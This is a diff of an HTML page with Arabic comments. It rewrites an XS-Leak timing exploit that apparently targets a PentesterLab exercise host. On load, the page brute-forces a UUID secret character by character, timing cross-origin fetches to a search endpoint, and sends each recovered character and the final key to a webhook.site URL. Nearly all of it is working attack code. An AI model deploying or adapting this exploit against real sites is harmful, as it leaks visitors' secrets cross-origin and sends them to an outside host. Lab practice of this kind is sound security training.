@@ -2,70 +2,102 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>XS-Leak Attack - PentesterLab</title>
+    <title>HackerAI - XS-Leak Exploit</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #00ff00; padding: 20px; }
+        .container { border: 1px solid #333; padding: 20px; border-radius: 8px; background-color: #222; }
+        #key-display { font-size: 24px; color: #ff00ff; word-break: break-all; margin: 10px 0; }
+        .status { color: #aaa; }
+        .log { background: #000; padding: 10px; height: 300px; overflow-y: scroll; font-size: 12px; border: 1px solid #444; margin-top: 10px; }
+    </style>
 </head>
 <body>
-    <h1 style="color: red;">جاري تنفيذ هجوم XS-Leak...</h1>
-    <div id="results">
-        <p>المفتاح المستخرج حالياً: <span id="key" style="font-weight: bold; color: blue;">-</span></p>
-        <p>آخر محاولة: <span id="attempt">-</span></p>
-    </div>
 
-    <script>
-        const TARGET_URL = "http://ptl-41f731a5e034-c2c22805e34a.libcurl.me/search?search=";
-        const WEBHOOK_URL = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
-        const CHARSET = "0123456789-abcdef";
-        const THRESHOLD = 1300; // الحد الفاصل بناءً على ملاحظتك (1330ms للمطابق)
+<div class="container">
+    <h1>XS-Leak Timing Attack (UUID)</h1>
+    <p class="status">الحالة: <span id="status">جاهز للبدء...</span></p>
+    <div>المفتاح المستخرج حالياً:</div>
+    <div id="key-display">جاري البدء...</div>
+    
+    <div class="log" id="log"></div>
+</div>
+
+<script>
+    const TARGET_BASE = "http://ptl-41f731a5e034-c2c22805e34a.libcurl.me/search?search=";
+    const WEBHOOK_URL = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
+    const CHARSET = "0123456789-abcdef";
+    const THRESHOLD = 3000; // الحد الفاصل الذي طلبته (3 ثوانٍ)
+    
+    let leakedKey = "";
+    const logElement = document.getElementById('log');
+
+    function log(msg) {
+        const div = document.createElement('div');
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logElement.appendChild(div);
+        logElement.scrollTop = logElement.scrollHeight;
+    }
+
+    async function checkChar(testKey) {
+        // نستخدم caret (^) للتأكد من مطابقة بداية السلسلة
+        const url = `${TARGET_BASE}${testKey}^&cb=${Math.random()}`;
+        const start = performance.now();
         
-        let leakedKey = "";
-
-        async function measureTime(url) {
-            // إضافة parameter عشوائي لتجنب الكاش (Cache Busting)
-            const finalUrl = `${url}&_t=${Math.random()}`;
-            const start = performance.now();
-            
-            try {
-                // استخدام fetch مع no-cors لعمل الطلب عبر المواقع
-                await fetch(finalUrl, { mode: 'no-cors', cache: 'no-cache' });
-            } catch (e) {
-                // أخطاء الـ CORS لا تهمنا، ما يهمنا هو الوقت المستغرق
-            }
-            
-            return performance.now() - start;
+        try {
+            // استخدام fetch مع no-cors لتجنب مشاكل السياسات الأمنية للمتصفح
+            await fetch(url, { mode: 'no-cors', cache: 'no-cache' });
+        } catch (e) {
+            // الخطأ متوقع بسبب CORS ولكن التوقيت لا يتأثر
         }
+        
+        return performance.now() - start;
+    }
 
-        async function startExploit() {
-            // الـ UUID عادة يتكون من 36 حرفاً
-            for (let i = 0; i < 36; i++) {
-                for (let char of CHARSET) {
-                    const currentTry = leakedKey + char;
-                    document.getElementById("attempt").innerText = currentTry;
+    async function startExploit() {
+        log("بدء الهجوم على النطاق المستهدف...");
+        document.getElementById("status").innerText = "جاري الاستخراج...";
 
-                    // نختبر الحرف باستخدام الـ caret ^ كما هو مطلوب في التمرين
-                    const timeTaken = await measureTime(`${TARGET_URL}${currentTry}^`);
+        // طول الـ UUID هو 36 حرفاً (بما في ذلك الشرطات)
+        for (let i = 0; i < 36; i++) {
+            let foundInThisRound = false;
+
+            // إذا كان الحرف الحالي هو موضع شرطة في UUID (اختياري للتحسين)
+            // if (i === 8 || i === 13 || i === 18 || i === 23) { ... }
+
+            for (let char of CHARSET) {
+                const currentTry = leakedKey + char;
+                log(`تجربة: ${currentTry}...`);
+                
+                const duration = await checkChar(currentTry);
+                log(`الوقت المستغرق: ${duration.toFixed(2)}ms`);
+
+                if (duration >= THRESHOLD) {
+                    leakedKey += char;
+                    document.getElementById("key-display").innerText = leakedKey;
+                    log(`*** تم العثور على حرف: ${char} ***`);
                     
-                    console.log(`Testing: ${currentTry} | Time: ${timeTaken.toFixed(2)}ms`);
-
-                    if (timeTaken >= THRESHOLD) {
-                        leakedKey += char;
-                        document.getElementById("key").innerText = leakedKey;
-                        
-                        // إرسال الحرف الذي تم العثور عليه إلى الـ Webhook الخاص بك فوراً
-                        fetch(`${WEBHOOK_URL}?found=${leakedKey}&time=${timeTaken.toFixed(2)}`);
-                        
-                        // ننتقل للحرف التالي في السلسلة
-                        break; 
-                    }
+                    // إرسال الحرف المكتشف إلى الـ Webhook الخاص بك
+                    fetch(`${WEBHOOK_URL}?found=${leakedKey}&duration=${duration.toFixed(2)}`);
+                    
+                    foundInThisRound = true;
+                    break; // انتقل للحرف التالي في الـ UUID
                 }
             }
-            
-            // إرسال النتيجة النهائية
-            fetch(`${WEBHOOK_URL}?final_key=${leakedKey}`);
-            alert("تم استخراج المفتاح بالكامل: " + leakedKey);
+
+            if (!foundInThisRound) {
+                log("لم يتم العثور على مطابقة في هذه الدورة، قد يكون هناك خلل في التوقيت.");
+                // يمكن إضافة منطق لإعادة المحاولة هنا إذا لزم الأمر
+            }
         }
 
-        // بدء الهجوم
-        startExploit();
-    </script>
+        log("انتهى الهجوم. المفتاح الكامل: " + leakedKey);
+        document.getElementById("status").innerText = "اكتمل الهجوم!";
+        fetch(`${WEBHOOK_URL}?final_key=${leakedKey}`);
+    }
+
+    // تأخير البدء لثانية واحدة لضمان استقرار المتصفح
+    setTimeout(startExploit, 1000);
+</script>
+
 </body>
 </html>
